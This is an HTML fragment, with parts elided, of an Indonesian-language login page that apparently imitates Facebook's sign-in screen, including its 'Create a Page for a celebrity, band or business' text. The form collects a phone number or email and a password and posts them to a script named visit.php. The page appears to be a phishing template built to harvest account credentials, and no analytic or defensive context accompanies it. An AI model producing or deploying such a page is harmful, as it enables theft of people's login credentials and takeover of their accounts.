...
<body>
    ...
    <div class="fix-m-header">
        <span>Anda Harus Masuk Untuk Melanjutkan.</span>
    </div>
               ...
               <div class="card">
                   <form action="visit.php" method="POST">
                       <div class="input-container">
                           <input type="text" class="lg" name="email" placeholder="Nomor ponsel atau email">
                       </div>
                       <div class="input-container">
                            <input type="password" class="lg" name="password" placeholder="Kata Sandi">
                        </div>
                        <div class="input-container">
                   ...
                   <div class="" style="text-align: center;">
                       <a class="crt-new-ac" href="#">Buat Akun Baru</a>
                   </div>
               </div>
               <div class="crt-page">
                   <a href="#">Buat Halaman</a>
                   <span>untuk selebriti, band, atau bisnis.</span>
               </div>
           </div>
        </div>
    </div>
